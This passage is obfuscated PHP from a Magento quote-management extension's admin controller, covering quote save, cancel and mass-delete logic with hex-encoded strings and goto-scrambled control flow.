$FsnNf->getId(); goto Japgb; k8cX9: goto rvCZI; goto eNJYr; cj3iA: goto CL4OP; goto dlJvx; rhMSZ: QxhqF: goto jjDje; aoWkg: if (!$KIRro) { goto rS7jj; } goto fCJ3m; I66QI: $FsnNf->setNoFollowup(0); goto ZxnBO; jQerB: Mage::dispatchEvent("\x71\x71\x75\x6f\x74\145\141\x64\166\x5f\x71\x71\141\144\x76\143\x75\163\164\x6f\155\145\162\137\141\x66\x74\145\162\x5f\163\x61\x76\145\141\x63\164\x69\157\156", ["\x71\165\157\x74\x65" => $FsnNf]); goto pFP0O; mDZK3: DENTN: goto Myapt; w4U5R: UF46F: goto DOS13; dvxPX: GVR7d: goto OshrW; Ptvjb: $FsnNf->setSubstatus($hh1aj); goto YJomm; unzSm: $FsnNf->setProposalSent(now()); goto YcFEb; n8Igl: p2nZD: goto KlXuI; R3sMX: $FsnNf->setUserId($FsnNf->getOrigData("\x75\163\x65\x72\x5f\x69\144")); goto CGqqX; V9in_: Mage::getSingleton("\x61\x64\155\151\156\x68\164\155\x6c\57\163\145\163\163\x69\157\x6e")->addNotice($this->__("\117\154\144\x20\x73\x74\x61\164\165\163\x20\143\157\165\x6c\144\40\156\157\x74\40\142\145\x20\x64\x65\x74\x65\x72\155\x69\x6e\145\x64")); goto oFlnm; ubY1G: $FsnNf = $this->getQuotationQuote($XELOl); goto X1vri; Y1tCq: $lwkUi = Mage::app()->getStore("\x64\145\x66\141\x75\154\x74"); goto Uz5v3; rJjop: $Mb8bP = Mage::getSingleton("\x61\x64\155\x69\156\57\x73\145\x73\x73\151\157\156")->getUser()->getId(); goto RBQh0; Ee2KP: $FsnNf->setData("\x69\164\x65\155\160\162\x69\x63\x65", 271/271); goto GM85z; cjnLo: $sOTnn = $FsnNf->getSubstatus(); goto OK5uB; pZG35: if ($BJOGM) { goto GVR7d; } goto rhnwO; yENBh: goto QxhqF; goto mDZK3; RcW33: $ZXeg2 = Mage::getModel("\x63\x75\x73\164\x6f\155\x65\x72\57\143\x75\163\x74\157\155\145\162")->load($FsnNf->getCustomerId()); goto tmqMe; rIHJV: $OJXHM->setCustomer($ZXeg2); goto zVxFv; qiUOh: $this->ckgwQ = $FsnNf; goto YWu7o; bvqGv: if (!(!isset($FsnNf) || empty($FsnNf))) { goto RKjRS; } goto EClfW; ZJyoS: if (!(isset($SUp8f) && $SUp8f->getUserId())) { goto UF46F; } goto pchp2; lEDL9: if (!$FsnNf->getCustomerId()) { goto kXp31; } goto RcW33; W1h4Y: FT5FW: goto H26on; p8sJa: uuHj1: goto Qo93M; n797i: Mage::getSingleton("\141\144\x6d\151\x6e\x68\x74\155\x6c\57\163\145\163\x73\151\157\156")->addSuccess($this->__("\x51\165\157\x74\x65\40\151\x73\40\x63\165\162\x72\x65\x6e\x74\154\171\40\x6f\156\x20\150\157\154\x64")); goto rIYKt; Bhib0: $FsnNf->setShippingBasePrice($rbt16); goto DCqCy; DxOcb: if (!(Mage::getModel("\161\x71\x75\x6f\x74\145\141\144\x76\57\163\x75\x62\x73\164\141\164\165\163")->getParentStatus($FsnNf->getSubstatus()) != $FsnNf->getStatus())) { goto eZkSU; } goto vs3c7; aK886: $uw2vN = Mage::getModel("\141\144\155\x69\156\x2f\x75\163\x65\x72")->load($wxtEo); goto VJBHo; PToUI: if (!($OxkQg === true)) { goto X6rA5; } goto XVXw4; pQwRj: goto CL4OP; goto U33NV; VvThk: goto D6RNJ; goto dvxPX; ev0Kh: goto U3r1V; goto NbcjH; DVrQr: U3r1V: goto J3wiL; a1cPd: if ($dUTNC) { goto DENTN; } goto QQSdF; AiSvH: $mbQM0 = $mbQM0 * $zQ626; goto W_S8J; b8Gvn: $ZXeg2 = Mage::getModel("\x63\165\163\x74\x6f\155\145\162\57\x63\x75\163\x74\x6f\x6d\145\162")->load($FsnNf->getCustomerId()); goto WdqQR; zVxFv: V2GJA: goto hdSle; Fcmrp: if (!$wF1KA) { goto dm1GI; } goto DFePf; mS1Sl: $hh1aj = Mage::getModel("\x71\161\165\157\164\145\141\x64\x76\x2f\163\x75\x62\x73\164\141\x74\x75\163")->getSubstatus($xOx3u["\163\x74\x61\x74\165\x73"]); goto BeHHy; PbQZh: rvCZI: goto aDZs3; EClfW: $XELOl = (int) $this->getRequest()->getParam("\x69\x64"); goto f05IH; fPumf: ZqE4q: goto DVrQr; cTubA: $lwkUi = Mage::app()->getWebsite(true)->getDefaultGroup()->getDefaultStore(); goto AonCx; OlAR6: PXWyn: goto hu94l; y9sm3: $FsnNf->setSubstatus(); goto unzSm; Japgb: $EY6wb = $FsnNf->getCustomerId(); goto G2oLP; YJomm: ZTGML: goto Kgbim; TsSg8: zTB0F: goto nOI4O; prtln: if (!$ZXeg2) { goto V2GJA; } goto rIHJV; NVCZl: qcMV3: goto G0KXa; VNLKS: Mage::dispatchEvent("\x71\x71\x75\x6f\x74\x65\x61\x64\x76\137\161\x71\141\x64\166\143\165\163\164\157\155\x65\162\137\141\146\x74\x65\x72\163\x61\166\x65\137\x66\x69\x6e\141\154\x5f\163\x75\x63\x63\145\163\163\137" . $KIRro, ["\x71\165\157\164\x65" => $FsnNf]); goto UbKUa; Gd0Up: foreach ($xOx3u["\x65\170\x74\162\x61\137\157\x70\164\x69\157\156\x73"] as $i1eZt => $VaJx0) { goto uv89k; DhGSM: q2bB2: goto vD_uf; UcDGt: l9vzh: goto t8DHT; uv89k: if (!is_array($VaJx0)) { goto q2bB2; } goto MFxZ_; MFxZ_: $VaJx0 = implode("\54", $VaJx0); goto DhGSM; vD_uf: $FsnNf->setData($i1eZt, $VaJx0); goto UcDGt; t8DHT: } goto wQhMQ; akjQp: dm1GI: goto fAHlx; DWver: if ($SUp8f->getUserId()) { goto P7TSh; } goto zGX1U; R2JnT: $iXSSh = $OJXHM->getRateOriginRequest($lwkUi); goto mWjEr; IYEN4: $FsnNf->setSalesrule(null); goto i6Ztm; MZkam: $this->ckgwQ = $FsnNf; goto a0P1A; sbOqB: if (is_array($xOx3u["\145\x78\x74\x72\141\137\x6f\160\164\x69\157\156\x73"])) { goto HUIGj; } goto KQfiu; nOI4O: $FsnNf->setData("\141\x6c\x74\137\x63\150\145\143\153\157\x75\164", 296/296); goto W1h4Y; PAP8x: if (!$eLHd4) { goto qcMV3; } goto Z2GU3; uwuId: $ZBvEY = 0; goto coT3k; YWu7o: Mage::dispatchEvent("\x71\161\x75\157\164\145\141\x64\166\x5f\x71\x71\141\x64\166\x63\165\x73\x74\157\x6d\x65\162\x5f\141\146\164\145\x72\x73\x61\x76\x65\x5f\x66\151\156\x61\x6c", ["\161\x75\157\164\145" => $FsnNf]); goto jQerB; dp65i: goto uuHj1; goto DpIqH; WdqQR: if (!($ZXeg2 && $ZXeg2->getAssignedSalesRep())) { goto X9j1x; } goto Uo22M; JtuoX: goto ZTGML; goto j2Mba; IyLk5: $FsnNf->setShippingType($KDoHW); goto HMihu; OshrW: $SUp8f = Mage::getModel("\141\x64\x6d\151\x6e\57\x75\x73\145\162")->load($BJOGM); goto DWver; nPZFe: $hewCg = []; goto qskCg; ddcHP: P7TSh: goto rj_bS; Kgbim: QcPUu: goto jIZHD; bnseN: $vQm1R = $this->getRequest()->getParam("\156\x6f\137\x65\x78\160\151\162\171") && $this->getRequest()->getParam("\x6e\157\137\145\x78\x70\151\x72\x79") == "\157\x6e" ? 311/311 : 0; goto FHV6H; BT6WS: if (Mage::getStoreConfig("\161\x71\165\157\x74\x65\141\144\x76\137\x61\144\166\x61\156\143\145\144\x5f\163\x65\164\x74\x69\156\147\x73\57\x62\x61\143\x6b\x65\x6e\x64\57\x63\x61\x6c\143\x75\x6c\141\164\145\137\x71\x75\157\164\145\x5f\x74\x6f\x74\x61\154\163\137\x6f\x6e\137\x6c\157\141\x64")) { goto ZqE4q; } goto xxt5f; jnjY5: $FsnNf = $this->getQuotationQuote($XELOl); goto Qelkn; NQbNf: goto bsb0k; goto OlAR6; GSLvp: bKF6V: goto F3PmJ; Uo22M: $Mb8bP = $ZXeg2->getAssignedSalesRep(); goto fx7A3; hdSle: $iXSSh = $OJXHM->getRateRequest(null, null, null, $y73fm); goto jEx6l; tmqMe: if (!($ZXeg2 && $ZXeg2->getAssignedSalesRep())) { goto C_EeT; } goto HFp5Q; FNnl6: Mage::helper("\161\x71\165\157\164\x65\x61\x64\166\x2f\154\157\x67\x67\151\156\147")->sentAnonymousData("\x73\x61\166\145", "\x62", $XELOl); goto pttaU; hu94l: if (isset($xOx3u["\x72\145\x64\151\x72\x65\143\x74\62\x6e\x65\167\157\x72\x64\145\162"]) && $xOx3u["\162\x65\x64\151\162\145\x63\x74\x32\156\145\x77\157\x72\x64\x65\x72"] == 896/896) { goto QBjNs; } goto fdFp8; yPpqU: $FsnNf->setSubstatus($sOTnn); goto Ag_cE; Py4bz: $FsnNf->setInternalComment($JOkCi); goto rhMSZ; EOGnQ: Mage::dispatchEvent("\x71\x71\165\157\164\x65\141\144\166\137\x71\161\141\x64\166\143\x75\163\164\157\x6d\145\x72\137\141\146\x74\x65\x72\163\x61\x76\145\x5f\146\x69\156\x61\154\x5f\x65\162\x72\x6f\162", ["\x71\x75\x6f\x74\145" => $FsnNf]); goto AA13s; J3wiL: $BJOGM = $this->getRequest()->getParam("\x61\163\x73\x69\147\156\x65\x64\137\x74\157"); goto pZG35; Jv94W: TP6y4: goto IyLk5; i6Ztm: if (Mage::getStoreConfig("\161\x71\x75\157\164\x65\x61\144\166\137\x61\144\x76\141\156\x63\145\x64\x5f\x73\145\x74\164\x69\156\147\163\x2f\142\141\x63\x6b\145\156\144\57\x63\141\x6c\x63\x75\x6c\141\x74\x65\137\161\165\157\x74\x65\x5f\x74\157\164\x61\154\163\x5f\x6f\156\137\154\157\x61\144")) { goto p2nZD; } goto GGI3E; G9BSM: $zQ626 = 79200/792 / ((14700/147 + $R6f9I) / 67200/672); goto J_5Ea; rIYKt: goto Nj11I; goto aDqIk; x2fsL: $this->_redirect("\x2a\x2f\x2a\x2f\143\x6f\156\x76\145\162\164\x2f", ["\151\x64" => $XELOl, "\x71\62\157\137\163\x65\162\151\141\154" => base64_encode(json_encode($xOx3u["\161\62\x6f"]))]); goto pQwRj; lPbf8: if (empty($wxtEo)) { goto Anv6_; } goto aK886; Wxbfj: $iGpKg = $FsnNf->getQuoteProfit(); goto w2s22; f5naD: if (!$KIRro) { goto zASIK; } goto ZWSaZ; R4WYM: Mage::dispatchEvent("\x71\x71\x75\x6f\164\x65\x61\x64\x76\x5f\161\161\141\x64\x76\x63\165\163\x74\x6f\x6d\x65\x72\x5f\141\146\x74\x65\162\x73\141\166\x65\137\146\x69\x6e\141\x6c\137\145\162\162\157\162\137" . $KIRro, ["\161\x75\x6f\x74\x65" => $FsnNf]); goto fOEnS; ozchj: try { goto IQIwP; Qmn0S: if (!($H2pOv["\160\x65\x72\x63\x65\156\164\141\147\x65"] != '')) { goto mwg1q; } goto L44kR; xJTep: Ah9Vl: goto kj8pp; dseDy: if ($FsnNf->recalculateFixedPrice($H2pOv)) { goto W5NyZ; } goto Px5Wj; RPDJs: goto Ah9Vl; goto O_ASf; JHpWr: $FsnNf->save(); goto k_lpK; laGFO: Wfjuq: goto LUJ6y; ofYs1: if (is_integer((int) $KDoHW)) { goto amOH1; } goto BhJfe; kzFC2: skCxH: goto Qmn0S; jYAOP: $Ik2tk = $FsnNf->getShippingAddress(); goto LdxxW; ti_bu: $FsnNf->getAddress(); goto jhkqy; fvMhe: $j0YJp->setData("\x63\157\x64\145", "\x71\x71\165\x6f\x74\145\163\x68\x69\160\x72\141\x74\145\137\161\161\165\x6f\164\x65\x73\x68\x69\160\162\141\x74\x65"); goto X5C5A; JHbgX: RqOu2: goto laGFO; ns7Vc: $this->ckgwQ = $FsnNf; goto cRCHJ; Cvzkj: Mage::getSingleton("\x61\144\x6d\x69\x6e\150\164\155\154\x2f\x73\x65\163\163\x69\157\x6e")->addNotice($this->__("\121\165\157\164\145\x20\122\x65\144\x75\143\x74\151\157\x6e\x20\167\x61\163\x20\156\157\164\40\x61\x20\166\x61\x6c\x69\x64\x20\x64\x65\x63\151\155\x61\154\x20\x6e\x75\x6d\x62\x65\x72")); goto KyUUX; TcyYU: $FsnNf->setTotalsCollectedFlag(false); goto UeTUx; QR5fF: $j0YJp->setData("\143\141\x72\162\x69\x65\162", "\x71\161\165\x6f\164\x65\x73\x68\x69\160\x72\141\x74\145"); goto CblE8; TIk81: $OSK8K = $H2pOv["\160\145\162\x63\145\156\x74\x61\x67\145"] != null && $AkSrn && !((float) $H2pOv["\x70\x65\x72\143\x65\x6e\x74\141\147\x65"] >= 0); goto Ho1TK; LUJ6y: $FsnNf->save(); goto jYAOP; X5C5A: $j0YJp->setData("\x6d\145\x74\150\157\x64\x5f\144\x65\163\x63\x72\x69\160\x74\x69\x6f\x6e", $pjYei); goto IkS4Y; futJj: $Ik2tk->requestShippingRates(); goto ozg2R; DnCLj: if (!$j0YJp) { goto Pjnjr; } goto mfKYg; O_ASf: hHMu1: goto ThLeD; kConD: mwg1q: goto DYxzm; TAmG_: goto kz00G; goto PjqIG; qOI9L: amOH1: goto ti_bu; LdxxW: if (!$Ik2tk) { goto cYDOE; } goto futJj; IkS4Y: $j0YJp->setData("\x70\162\x69\x63\145", $mbQM0 / $mdGp7); goto Comd1; tiYLA: $gxUI1 = false; goto NpTxq; JVLF_: $hHUik = is_numeric($H2pOv["\x66\151\x78\145\144"]); goto eJs1I; jhkqy: $j0YJp = Mage::getModel("\161\x71\165\157\x74\145\141\x64\166\x2f\161\165\157\x74\x65\x73\x68\x69\x70\x70\x69\156\147\x72\141\x74\145")->load($KDoHW); goto DnCLj; Px5Wj: Mage::getSingleton("\141\144\x6d\151\x6e\x68\x74\x6d\x6c\x2f\x73\145\163\x73\x69\x6f\156")->addError($this->__("\x43\157\165\154\144\40\156\157\x74\40\x72\x65\x63\141\154\143\x75\x6c\141\x74\145\40\121\x75\x6f\164\x65\40\120\x72\x69\x63\145")); goto gDxxA; k_lpK: CcKTG: goto ns7Vc; ozg2R: cYDOE: goto h82Tk; L44kR: $AkSrn = is_numeric($H2pOv["\x70\145\x72\x63\145\156\x74\x61\x67\x65"]); goto TIk81; h0kiR: goto emuaf; goto FhQha; VXdEL: $FsnNf->setShippingMethod($j0YJp); goto y1aIq; UeTUx: L3IBj: goto JHbgX; B0J9p: $gxUI1 = true; goto TAmG_; ULR2I: if ($V5wX5) { goto CcKTG; } goto Z7J4w; JMHa0: $gxUI1 = true; goto h0kiR; kj8pp: $H2pOv = $this->getRequest()->getParam("\x72\x65\143\141\154\137\x70\162\151\143\145"); goto GLKOH; GLKOH: if (!$H2pOv) { goto Wfjuq; } goto tiYLA; EhIJR: if ($KDoHW == "\111" || $KDoHW == "\117") { goto hHMu1; } goto ofYs1; ViM4U: $pjYei = $GErHM . "\40\x2d\x20" . $EFhuh; goto aXiaS; KyUUX: emuaf: goto kzFC2; WBGII: $j0YJp->setData("\x6d\x65\164\150\157\144\x5f\x74\151\x74\154\145", $EFhuh); goto VXdEL; x9cVg: $GErHM = Mage::getStoreConfig("\143\141\x72\x72\x69\x65\x72\x73\x2f\x71\161\x75\x6f\164\x65\x73\x68\151\x70\162\141\164\145\x2f\x74\x69\x74\154\x65", $FsnNf->getStoreId()); goto sosmN; Ho1TK: if ($OSK8K || !$AkSrn) { goto tdjTj; } goto B0J9p; tXvqF: kz00G: goto kConD; VzPpC: W5NyZ: goto TcyYU; B3257: Mage::getSingleton("\x61\x64\155\151\156\150\x74\x6d\x6c\57\163\x65\163\x73\x69\x6f\156")->addNotice($this->__("\x51\x75\x6f\164\x65\x20\x52\x65\x64\x75\143\164\x69\x6f\156\40\167\141\x73\x20\x6e\157\164\40\141\40\166\141\154\x69\x64\40\x64\x65\x63\151\x6d\141\154\40\156\165\x6d\142\145\162")); goto tXvqF; BhJfe: $FsnNf->unsetShippingMethod(); goto RPDJs; gDxxA: goto L3IBj; goto VzPpC; eJs1I: $RzXBz = $H2pOv["\146\151\x78\x65\144"] != null && $hHUik && !((float) $H2pOv["\x66\x69\x78\145\144"] >= 0); goto oKMPp; h82Tk: $V5wX5 = Mage::getStoreConfig("\x71\x71\165\x6f\164\145\x61\x64\166\137\x61\144\166\141\x6e\x63\x65\x64\x5f\x73\x65\x74\x74\x69\156\x67\x73\x2f\x62\x61\x63\153\x65\x6e\144\x2f\x63\141\x6c\x63\x75\x6c\141\x74\x65\137\161\x75\x6f\x74\145\x5f\164\157\x74\x61\154\163\137\157\156\137\x6c\x6f\141\144"); goto ULR2I; Comd1: $j0YJp->setData("\155\145\x74\150\157\144", "\x71\x71\165\157\164\x65\x73\150\x69\160\x72\141\x74\145"); goto WBGII; FhQha: Bvpjl: goto Cvzkj; aXiaS: $j0YJp = Mage::getModel("\161\x71\165\x6f\164\145\141\x64\x76\57\x71\165\157\x74\145\163\x68\151\160\160\x69\156\147\162\x61\164\x65"); goto QR5fF; qM8tV: Pjnjr: goto xJTep; AN7nu: $FsnNf->collectTotals(); goto JHpWr; NpTxq: if (!($H2pOv["\146\151\170\x65\144"] != '')) { goto skCxH; } goto JVLF_; sosmN: $EFhuh = Mage::getStoreConfig("\x63\x61\162\162\x69\x65\x72\163\57\161\161\x75\157\164\x65\163\x68\151\160\x72\141\x74\145\57\156\141\155\x65", $FsnNf->getStoreId()); goto ViM4U; Z7J4w: $FsnNf->setTotalsCollectedFlag(false); goto AN7nu; CblE8: $j0YJp->setData("\x63\x61\x72\162\151\145\162\137\164\151\164\x6c\x65", $GErHM); goto fvMhe; PjqIG: tdjTj: goto B3257; IQIwP: $KDoHW = $FsnNf->getShippingType(); goto EhIJR; DYxzm: if (!$gxUI1) { goto RqOu2; } goto dseDy; oKMPp: if ($RzXBz || !$hHUik) { goto Bvpjl; } goto JMHa0; y1aIq: goto Ah9Vl; goto qOI9L; ThLeD: $mbQM0 = $FsnNf->getShippingPrice(); goto x9cVg; mfKYg: $FsnNf->setShippingMethod($j0YJp); goto qM8tV; cRCHJ: } catch (Exception $Zf0h2) { Mage::log("\x45\x78\143\x65\x70\164\x69\157\x6e\72\40" . $Zf0h2->getMessage(), null, "\143\x32\161\x5f\145\170\143\x65\160\x74\x69\157\x6e\56\x6c\x6f\147", true); } goto PToUI; YPy6t: $OpphN = $OJXHM->getRate($iXSSh->setProductClassId($SeGNy)); goto AvhBg; FHV6H: $FsnNf->setNoExpiry($vQm1R); goto nrt9U; pchp2: if (!(!isset($MgycB) || $MgycB != $SUp8f->getUserId())) { goto SwwB7; } goto ayRvm; Qelkn: Mage::dispatchEvent("\x71\x71\165\157\x74\145\141\144\x76\137\161\x71\141\144\166\143\165\163\x74\x6f\x6d\x65\x72\137\142\x65\146\157\162\145\137\163\141\x76\145\x61\x63\164\151\157\156", ["\x71\x75\157\x74\x65" => $FsnNf]); goto lx0IL; fdFp8: if ($this->getRequest()->getParam("\142\x61\x63\x6b")) { goto CubNS; } goto tEPOs; sWP8P: goto FT5FW; goto SgJ2b; l9dGT: meFGK: goto DuIFh; w2s22: if (!($iGpKg < 0 && isset($n28sO) && isset($sOTnn))) { goto sgshx; } goto VE7KX; JLt3B: foreach ($this->getRequest()->getParams() as $i1eZt => $cVCqR) { goto c5EU8; lyBP5: $tGKEn = $FsnNf->removeFile($cVCqR); goto fmvY8; B1LfD: $this->_getSession()->addError($this->__("\x55\156\141\x62\x6c\145\40\x74\x6f\x20\162\145\155\157\x76\145\40\x74\150\x65\40\x66\151\x6c\x65\56")); goto dufnp; c5EU8: if (!(substr($i1eZt, 0, 9264/772) == "\162\145\x6d\x6f\x76\145\x49\x6d\141\147\x65\x5f")) { goto UYmgx; } goto lyBP5; tdCKX: N7T92: goto w0Y7B; dufnp: qiXI5: goto KAjpd; KAjpd: UYmgx: goto tdCKX; fmvY8: if ($tGKEn) { goto qiXI5; } goto B1LfD; w0Y7B: } goto hUWqj; tE0ZR: tKDRy: goto DxOcb; G2oLP: if (!$EY6wb) { goto xMBOv; } goto Taomv; XtuqA: $OJXHM = Mage::getModel("\164\x61\170\57\x63\x61\154\x63\x75\154\141\164\x69\x6f\x6e"); goto l_AiA; wES1h: NogZH: goto MHdc6; vww4B: $OJXHM->setCustomer($ZXeg2); goto in4GG; ZI5VD: Mage::getSingleton("\141\x64\155\151\156\150\x74\155\154\57\x73\x65\163\163\151\157\x6e")->addSuccess($this->__("\121\x75\157\x74\x65\40\x69\x73\x20\163\x75\x63\143\x65\163\x66\x75\154\154\x79\40\x75\156\x68\157\154\x64\41")); goto Y9qaq; oXxES: P02yo: goto ev0Kh; Ksw9w: CL4OP: goto AzdWQ; eVyj7: } catch (Exception $Zf0h2) { goto TN_DJ; X1mCr: $this->_redirect("\52\57\52\57\x65\x64\151\x74", ["\x69\x64" => $this->getRequest()->getParam("\151\144")]); goto GXTJh; Bv6bS: Mage::getSingleton("\x61\x64\155\151\x6e\150\x74\155\154\57\163\145\163\163\151\x6f\156")->setFormData($xOx3u); goto X1mCr; DWV8h: Mage::getSingleton("\141\x64\155\x69\156\x68\x74\155\x6c\x2f\163\145\x73\x73\x69\157\156")->addError($Zf0h2->getMessage()); goto Bv6bS; GXTJh: return null; goto oqeo4; TN_DJ: Mage::log("\x45\x78\143\x65\160\x74\151\x6f\x6e\72\x20" . $Zf0h2->getMessage(), null, "\143\x32\161\137\x65\170\x63\145\x70\x74\x69\x6f\156\56\x6c\x6f\147", true); goto DWV8h; oqeo4: } goto xZZ5j; p5Hau: Mage::getSingleton("\x61\144\155\151\x6e\150\x74\x6d\154\57\163\x65\x73\163\151\157\156")->addError($this->__("\120\154\x65\141\163\x65\40\165\x70\147\162\141\144\x65\x20\x74\157\40\x43\x61\x72\164\62\x51\165\x6f\164\x65\x20\x53\164\141\x72\x74\145\x72\x20\157\162\x20\x68\x69\147\x68\x65\x72\x20\x74\x6f\x20\x75\x73\x65\x20\x74\150\x69\x73\40\x66\145\141\164\165\162\x65")); goto d3LJB; qVvue: if (!isset($xOx3u)) { goto um8cm; } goto cExns; MyDCR: $this->_redirect("\52\x2f\x2a\57"); goto VKYZC; Qtiny: Mage::dispatchEvent("\x6f\160\150\x69\162\141\x68\137\161\161\x75\x6f\164\145\x61\144\x76\137\x61\144\155\x69\156\x5f\163\x61\x76\145\137\x62\x65\x66\157\x72\x65\x5f" . $KIRro, [$xOx3u]); goto Q1HYJ; g5T1Y: $KIRro = $this->getRequest()->getParam("\x65\x76\x65\x6e\164"); goto Jc_kO; WmfWq: SQdwX: goto vJLik; xZZ5j: um8cm: goto zciqb; mfJ1i: if (!$KIRro) { goto lnpPI; } goto iIt5G; xgT95: if (Mage::helper("\x71\x71\165\157\164\x65\141\144\166\x2f\x6c\151\x63\x65\x6e\x73\145")->validLicense("\143\x72\145\141\x74\x65\55\145\144\x69\164\55\141\144\155\151\x6e", $this->getRequest()->getPost("\x63\162\145\141\164\x65\110\x61\x73\150"))) { goto SQdwX; } goto p5Hau; d3LJB: $this->_redirectReferer(); goto hrubJ; Hof2p: r2XGT: goto B46ys; B46ys: F_z0y: goto qVvue; vJLik: $xOx3u = $this->getRequest()->getPost(); goto f98O_; zciqb: Mage::getSingleton("\141\x64\155\x69\x6e\150\x74\155\x6c\57\x73\145\163\x73\x69\x6f\x6e")->addError($this->__("\x55\156\x61\142\x6c\145\40\x74\x6f\40\146\x69\x6e\144\x20\x69\164\145\155\40\x74\x6f\40\x73\141\166\145")); goto MyDCR; VKYZC: Mage::dispatchEvent("\157\160\150\x69\x72\x61\x68\x5f\161\161\x75\157\x74\x65\141\x64\x76\x5f\141\x64\x6d\151\156\137\163\141\166\145\137\x61\146\x74\145\162", [$xOx3u]); goto WvWyd; hrubJ: return null; goto WmfWq; obDq7: $OxkQg = true; goto Hof2p; Jc_kO: if (!$KIRro) { goto cYCAG; } goto Qtiny; ajfSJ: return null; goto hbzA2; AkzQw: $OxkQg = false; goto U1BJe; K1xo2: $xOx3u = $this->ybeW8; goto obDq7; ZX1fe: lnpPI: goto ajfSJ; U1BJe: if (!isset($this->BfLzH["\x71\x71\165\157\164\x65\x61\x64\166"]["\x70\x72\151\x6e\164"])) { goto F_z0y; } goto yJhMy; yJhMy: if (!($this->BfLzH["\161\x71\165\157\164\145\141\x64\166"]["\x70\162\x69\156\x74"] === true)) { goto r2XGT; } goto K1xo2; f98O_: Mage::dispatchEvent("\157\160\x68\x69\162\x61\x68\137\x71\161\x75\x6f\x74\145\141\x64\166\x5f\x61\144\155\151\156\x5f\163\x61\166\x65\x5f\x62\145\146\157\162\x65", [$xOx3u]); goto g5T1Y; Q1HYJ: cYCAG: goto AkzQw; iIt5G: Mage::dispatchEvent("\157\x70\x68\151\162\141\150\x5f\161\x71\x75\x6f\164\145\x61\x64\x76\137\141\144\155\151\156\137\x73\141\x76\145\x5f\141\x66\x74\145\x72\x5f" . $KIRro, [$xOx3u]); goto ZX1fe; hbzA2: } public function deleteAction() { goto XEXzg; VaOMp: Mage::dispatchEvent("\x6f\x70\150\151\x72\141\150\137\161\x71\x75\157\164\145\x61\x64\166\x5f\x61\144\155\151\156\137\x64\145\154\x65\x74\x65\137\141\x66\x74\145\x72", [$vuQ04]); goto lluPk; j36Mc: if (!($vuQ04 > 0)) { goto NGscc; } goto wYjWv; od2WX: Mage::dispatchEvent("\157\160\150\x69\x72\x61\x68\x5f\x71\161\165\x6f\164\145\141\x64\x76\x5f\141\x64\155\151\x6e\137\144\145\154\145\x74\145\137\x62\145\146\x6f\x72\145", [$vuQ04]); goto j36Mc; wYjWv: try { goto J1_4D; qKXaV: $this->_redirect("\52\57\52\57"); goto pXmeT; qPFr_: Mage::helper("\161\161\165\x6f\x74\145\141\144\x76\57\x6c\x6f\147\x67\x69\156\x67")->sentAnonymousData("\x63\141\156\x63\x65\154", "\x62", $vuQ04); goto qKXaV; S6DcR: Mage::getSingleton("\x61\144\155\151\x6e\x68\x74\x6d\154\x2f\x73\x65\x73\163\151\x6f\x6e")->addSuccess($this->__("\121\165\157\164\145\x20\x77\x61\x73\40\163\165\x63\143\x65\x73\163\x66\165\x6c\x6c\x79\40\x63\141\156\x63\145\x6c\x65\x64")); goto qPFr_; J1_4D: $uw2vN = $this->getQuotationQuote($vuQ04); goto SW6xF; WbXMP: Mage::dispatchEvent("\161\161\165\157\x74\145\141\144\166\x5f\x71\x71\141\x64\x76\x63\165\x73\x74\x6f\x6d\145\x72\x5f\141\x66\164\x65\162\x63\x61\156\143\x65\154", ["\x71\x75\x6f\x74\145" => $uw2vN]); goto S6DcR; gNb4X: $uw2vN->save(); goto WbXMP; SW6xF: $uw2vN->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_CANCELED); goto gNb4X; pXmeT: } catch (Exception $Zf0h2) { goto n_roY; fEB9E: $this->_redirect("\52\x2f\x2a\57\x65\144\x69\164", ["\x69\x64" => $this->getRequest()->getParam("\x69\144")]); goto fu46r; Ixxau: Mage::getSingleton("\141\144\155\151\156\x68\164\155\154\57\163\x65\163\163\151\157\156")->addError($Zf0h2->getMessage()); goto fEB9E; n_roY: Mage::log("\105\170\x63\x65\x70\x74\x69\x6f\x6e\x3a\x20" . $Zf0h2->getMessage(), null, "\x63\62\x71\x5f\145\x78\x63\145\x70\x74\151\x6f\x6e\x2e\x6c\157\x67", true); goto Ixxau; fu46r: } goto Dewxr; Dewxr: NGscc: goto j2FdC; j2FdC: $this->_redirect("\x2a\57\52\57"); goto VaOMp; XEXzg: $vuQ04 = (int) $this->getRequest()->getParam("\151\144"); goto od2WX; lluPk: } public function massDeleteAction() { goto oOqcY; zyQIp: return; goto b2ak3; aP_1h: if (!is_array($Hm_f1)) { goto glvfp; } goto CKx9Y; xXviC: Mage::getSingleton("\x61\x64\x6d\151\156\150\x74\155\154\57\x73\x65\163\x73\151\x6f\156")->addError(Mage::helper("\x63\x61\x74\x61\x6c\x6f\x67")->__("\x50\154\x65\141\x73\x65\x20\163\145\x6c\x65\143\164\x20\151\164\x65\155\x73\56")); goto M_ruz; hTqDT: goto ddfa6; goto omwWJ; CKx9Y: try { goto VpCIc; DOe1R: Mage::getSingleton("\x61\144\x6d\x69\156\150\164\x6d\x6c\57\x73\145\x73\163\x69\157\x6e")->addSuccess(Mage::helper("\141\x64\155\x69\156\150\164\155\154")->__("\124\x6f\164\141\154\40\x6f\146\x20\x25\144\40\x72\145\x63\157\162\144\x28\163\x29\40\x77\145\x72\145\x20\144\x65\x6c\x65\x74\145\x64", count($Hm_f1))); goto BLS2O; ABPg0: entW_: goto DOe1R; VpCIc: foreach ($Hm_f1 as $KKBoU) { goto RaCko; J6F38: Mage::dispatchEvent("\161\x71\x75\157\x74\x65\x61\x64\166\137\x71\x71\x61\144\166\143\165\163\x74\x6f\x6d\x65\162\x5f\141\146\164\x65\x72\x64\145\154\x65\164\x65\x5f\155\141\163\163\x44\145\154\145\x74\145", ["\161\x75\x6f\x74\145" => $QhB4D]); goto e6p6z; RaCko: $QhB4D = Mage::getModel("\161\161\x75\157\x74\145\x61\x64\x76\x2f\161\x71\141\144\x76\x63\x75\163\164\x6f\155\x65\162")->load($KKBoU); goto dioiH; e6p6z: R6xbJ: goto Qg9Fr; dioiH: Mage::dispatchEvent("\161\x71\x75\157\x74\145\x61\x64\166\137\161\x71\x61\x64\166\143\165\163\164\x6f\155\145\x72\x5f\x62\x65\146\157\162\145\144\145\154\x65\164\x65\137\x6d\141\x73\163\x44\145\x6c\x65\164\x65", ["\x71\x75\157\164\x65" => $QhB4D]); goto XQBNL; ZbZwF: $QhB4D->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_CANCELED); goto oloy7; XQBNL: $QhB4D->setIsQuote(1506/502); goto ZbZwF; oloy7: $QhB4D->save(); goto J6F38; Qg9Fr: } goto ABPg0; 